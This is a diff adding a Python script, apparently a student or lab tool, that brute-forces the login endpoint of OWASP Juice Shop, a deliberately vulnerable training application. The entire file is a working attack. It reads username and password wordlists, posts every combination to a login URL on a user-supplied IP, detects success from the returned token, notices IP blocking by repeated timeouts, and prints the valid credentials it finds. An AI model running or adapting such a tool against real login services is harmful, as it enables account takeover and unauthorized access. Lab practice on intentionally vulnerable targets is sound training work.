@@ -1,0 +1,161 @@
+#!/usr/bin/env python3
+# Juice Shop Brute Force Script
+# For educational purposes only
+
+import requests
+import os
+import time
+import json
+
+def load_wordlist(filename):
+    # Load usernames or passwords from file
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    wordlist_path = os.path.join(script_dir, "lists", filename)
+    
+    try:
+        with open(wordlist_path, 'r') as f:
+            wordlist = [line.strip() for line in f if line.strip()]
+        return wordlist
+    except FileNotFoundError:
+        print(f"Error: Could not find {filename}")
+        return []
+
+def attempt_login(target_ip, username, password, timeout=5):
+    # Try to login with username and password
+    login_url = f"http://{target_ip}:3000/rest/user/login"
+    
+    payload = {
+        "email": username,
+        "password": password
+    }
+    
+    headers = {
+        "Content-Type": "application/json"
+    }
+    
+    try:
+        start_time = time.time()
+        response = requests.post(login_url, json=payload, headers=headers, timeout=timeout)
+        
+        if response.status_code == 200:
+            response_data = response.json()
+            if "authentication" in response_data and "token" in response_data["authentication"]:
+                return True, "success"
+        return False, "failed"
+        
+    except requests.exceptions.Timeout:
+        return False, "timeout"
+    except requests.exceptions.ConnectionError:
+        return False, "connection_error"
+    except Exception as e:
+        return False, "error"
+
+def main():
+    print("Juice Shop Brute Force Script")
+    print("Educational use only!")
+    print("")
+    
+    # Get target IP
+    target_ip = input("What is the IP of the Juice Shop Machine? ")
+    
+    # Test if target is reachable
+    print(f"Testing connection to {target_ip}:3000...")
+    try:
+        response = requests.get(f"http://{target_ip}:3000", timeout=5)
+        print("Connection successful!")
+    except:
+        print("Cannot reach target. Make sure Juice Shop is running.")
+        return
+    
+    # Load wordlists
+    print("Loading wordlists...")
+    usernames = load_wordlist("users.txt")
+    passwords = load_wordlist("passwords.txt")
+    
+    if not usernames or not passwords:
+        print("Error loading wordlists. Check that users.txt and passwords.txt exist.")
+        return
+    
+    print(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords")
+    print("Starting brute force attack...")
+    print("")
+    
+    # Try each combination
+    found_credentials = []
+    attempt = 0
+    total = len(usernames) * len(passwords)
+    consecutive_failures = 0
+    max_consecutive_failures = 3  # Number of consecutive timeouts before declaring host unavailable
+    
+    for username in usernames:
+        for password in passwords:
+            attempt += 1
+            print(f"[{attempt}/{total}] Trying {username}:{password}", end=" ")
+            
+            # Track start time to show elapsed time for slow requests
+            start_time = time.time()
+            success, status = attempt_login(target_ip, username, password, timeout=5)
+            elapsed_time = time.time() - start_time
+            
+            if success:
+                print("SUCCESS!")
+                print(f"Found valid login: {username}:{password}")
+                found_credentials.append((username, password))
+                consecutive_failures = 0  # Reset failure counter on success
+                
+                # Ask if user wants to continue
+                choice = input("Continue searching? (y/n): ")
+                if choice.lower() != 'y':
+                    break
+            elif status == "timeout":
+                consecutive_failures += 1
+                print(f"TIMEOUT ({elapsed_time:.1f}s)")
+                
+                # Check if we've had too many consecutive failures
+                if consecutive_failures >= max_consecutive_failures:
+                    print("")
+                    print("=" * 50)
+                    print("HOST NO LONGER AVAILABLE")
+                    print("Multiple consecutive timeouts detected.")
+                    print("The target may have blocked this IP or gone offline.")
+                    print("=" * 50)
+                    return
+                    
+            elif status == "connection_error":
+                consecutive_failures += 1
+                print("CONNECTION ERROR")
+                
+                # Check if we've had too many consecutive failures
+                if consecutive_failures >= max_consecutive_failures:
+                    print("")
+                    print("=" * 50)
+                    print("HOST NO LONGER AVAILABLE")
+                    print("Cannot establish connection to target.")
+                    print("The target may have blocked this IP or gone offline.")
+                    print("=" * 50)
+                    return
+            else:
+                print("FAILED")
+                consecutive_failures = 0  # Reset on normal failure (not timeout/connection error)
+            
+            # Add delay between requests
+            time.sleep(0.1)
+        
+        # Break outer loop if user chose to stop
+        if found_credentials and choice.lower() != 'y':
+            break
+    
+    # Show results
+    print("")
+    print("=== Results ===")
+    if found_credentials:
+        print(f"Found {len(found_credentials)} valid login(s):")
+        for username, password in found_credentials:
+            print(f"  {username}:{password}")
+    else:
+        print("No valid credentials found.")
+    
+    print("Attack finished.")
+
+if __name__ == "__main__":
+    main()
